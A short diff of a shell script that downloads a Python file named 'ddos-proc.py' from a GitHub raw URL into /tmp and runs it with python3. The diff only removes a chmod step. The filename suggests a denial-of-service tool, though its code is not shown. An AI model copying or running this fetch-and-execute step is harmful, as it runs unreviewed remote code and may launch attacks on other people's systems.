@@ -47,8 +47,5 @@ echo "[INFO] Downloading Python script..."
 curl -fsSL \
 https://raw.githubusercontent.com/LakshyaTheMinecrafter/skript.sh/main/ddos-proc.py \
 -o /tmp/ddos-proc.py
-
-chmod +x /tmp/ddos-proc.py
-
 echo "[INFO] Running Python script..."
 python3 /tmp/ddos-proc.py
